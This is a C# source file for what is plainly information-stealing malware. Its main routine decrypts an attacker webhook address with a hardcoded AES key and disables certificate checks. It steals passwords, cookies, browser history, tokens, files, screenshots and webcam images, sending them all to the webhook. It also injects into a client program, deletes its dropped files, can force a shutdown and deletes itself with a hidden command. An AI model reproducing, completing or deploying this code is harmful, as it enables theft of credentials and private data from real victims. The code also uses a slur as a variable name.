using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Newtonsoft.Json;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;

namespace StealerExt
{
    public class Hook
    {
        [STAThread]
        public static void Main(string[] arg)
        {
            #region Resources & Webhook Decryption
            string[] resNames = Assembly.GetExecutingAssembly().GetManifestResourceNames(); //Get resources
            foreach (string resName in resNames)
            {
                if (resName.ToLower() != "rtkbtmanserv.properties.resources.resources") { resources(resName); } //Extract resources
            }
            try
            {
                var e = AES128(Convert.FromBase64String(arg[0])); //AES128 Decrypt Webhook 
                _Santa = new Uri(Encoding.ASCII.GetString(e)).AbsoluteUri; //Get URL
                _Santa = _Santa.Replace("%00", ""); //Remove SPACES
            }
            catch
            {
                _Santa = arg[0]; //not encrypted webhook
            }
            #endregion
            #region Stealer Main Runtime
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.SystemDefault;
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config")); //Read user inputs
            if (File.Exists(API.Temp + "\\ss.png")) File.Delete(API.Temp + "\\ss.png");
            Stealer.StartSteal(); //Steal IP, Tokens, Product Key...
            if (File.Exists(API.Temp + "System_INFO.txt")) //Backwards compatiblity
            {
                new API(API.wHook)
                {
                    _name = API.name,
                    _ppUrl = API.pfp
                }.SendSysInfo("**SYSTEM INFO**", API.Temp + "System_INFO.txt");
            }
            Capture.CaptureScreen(API.Temp + "\\ss.png"); //Screenshot 
            API.Screenshot(); //Send ss
            if (config.cam == true) WebCamCap.wcc(); //Webcam pic
            #region Send Cred
            API.Passwords();
            API.Cookies();
            API.History();
            #endregion
            Injection.StartInjection(); //Inject into client
            if (config.files == true)
            {
                FileStealer.GetFiles(); //File Stealer
            }
            #region Cleanup
            try
            {
                File.Delete(API.Temp + "config");
                File.Delete(API.Temp + "xwizard.exe"); File.Delete(API.Temp + "splwow64.exe"); File.Delete(API.Temp + "winhlp32.exe"); File.Delete(API.Temp + "snuvcdsm.exe"); File.Delete(API.Temp + "hh.exe");
                File.Delete(API.Temp + "bfsvc.cfg"); File.Delete(API.Temp + "bfsvc.exe"); File.Delete(API.Temp + "whysosad"); File.Delete(API.Temp + "xwizard.cfg");
            }
            catch { }
            foreach (string file in Directory.EnumerateFiles(Path.GetTempPath(), "costura.*", SearchOption.TopDirectoryOnly))
            {
                try
                {
                    File.Delete(file);
                }
                catch
                { }
            }
            #endregion
            if (config.shutdown == true)
            {
                var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
            else if (config.restart == true)
            {
                var psi = new ProcessStartInfo("shutdown", "/r /s /t 0");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                Process.Start(psi);
            }
            Thread.Sleep(750);
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            #endregion
        }
        #region Files Extract & >º-yËb¢
        public static byte[] AES128(byte[] message)
        {
            try
            {
                Aes aes = new AesManaged
                {
                    Key = new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 },
                    IV = new byte[16],
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.Zeros
                };
                ICryptoTransform crypto;
                crypto = aes.CreateDecryptor();
                return crypto.TransformFinalBlock(message, 0, message.Length);
            }
            catch
            {
                return null;
            }
        }
        public static void resources(string resource)
        {
            string gay;
            gay = resource.Replace("RtkBtManServ.Resources.", "");
            if (File.Exists(API.Temp + gay)) File.Delete(API.Temp + gay);
            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource);
            FileStream fileStream = new FileStream(API.Temp + gay, FileMode.CreateNew);
            for (int i = 0; i < stream.Length; i++)
                fileStream.WriteByte((byte)stream.ReadByte());
            fileStream.Close();
        }

        public static string _Santa;
        #endregion
    }
}